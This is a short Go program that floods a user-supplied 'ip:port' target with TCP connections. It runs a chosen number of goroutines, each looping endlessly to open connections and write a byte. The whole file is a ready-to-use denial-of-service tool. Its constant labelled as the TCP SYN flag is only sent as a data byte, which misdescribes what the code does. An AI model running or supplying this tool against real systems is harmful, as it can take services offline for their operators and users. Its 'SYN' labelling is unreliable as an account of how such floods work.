package main

import (
	"flag"
	"fmt"
	"net"
	"sync"
	"time"
)

var addr string
var con int

const (
	SYN_FLAG = 0x02 // SYN标志位
)

func main() {
	flag.StringVar(&addr, "t", "", "ip:port")
	flag.IntVar(&con, "c", 10, "concurrency")
	flag.Parse()
	fmt.Println(addr, con)

	single()
}

func single() {
	var wg sync.WaitGroup

	for i := 0; i < con; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				createTcp()
			}
		}()
	}

	wg.Wait()
}

func createTcp() {
	dial, err := net.DialTimeout("tcp", addr, time.Hour*5)
	if err != nil {
		//logger.Error(dial, err)
		return
	}

	if dial != nil {
		dial.Write([]byte{SYN_FLAG})
	}

	defer func() {
		re := recover()
		if re != nil {
			//logger.Error(re)
		}
		if dial != nil {
			dial.Close()
		}
	}()
}
